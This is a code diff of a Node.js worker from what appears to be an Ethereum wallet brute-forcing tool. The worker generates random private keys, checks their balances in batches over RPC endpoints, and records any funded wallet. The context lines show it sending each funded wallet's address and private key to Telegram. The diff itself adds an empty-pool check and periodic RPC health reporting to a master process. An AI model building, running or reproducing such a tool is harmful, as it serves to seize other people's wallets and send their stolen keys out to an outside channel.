@@ -3,7 +3,7 @@ const https = require('https')
 const { randomBytes } = require('crypto')
 const { secp256k1 } = require('ethereum-cryptography/secp256k1')
 const { keccak256 } = require('ethereum-cryptography/keccak')
-const { rawRequest, getSortedPool, markSuccess, markError } = require('./rpc-manager')
+const { rawRequest, getSortedPool, getPoolStats, markSuccess, markError } = require('./rpc-manager')
 
 const BATCH_SIZE = 200
 const FUNDED_FILE = 'funded.txt'
@@ -26,6 +26,8 @@ async function batchCheckBalances(wallets) {
     const body = JSON.stringify(requests)
 
     const sorted = getSortedPool()
+    if (sorted.length === 0) return { checked: wallets.length, funded: [] }
+
     for (const rpc of sorted) {
         const t = Date.now()
         try {
@@ -73,6 +75,14 @@ function saveFunded(wallet, balanceWei) {
     sendTelegram(wallet.address, wallet.privateKey, ethStr)
     process.send({ type: 'funded', address: wallet.address, eth: ethStr })
 }
+
+// Report RPC pool health to master every 60 seconds
+setInterval(() => {
+    try {
+        const stats = getPoolStats()
+        process.send({ type: 'rpc_stats', ...stats })
+    } catch (_) {}
+}, 60000)
 
 async function run() {
     while (true) {
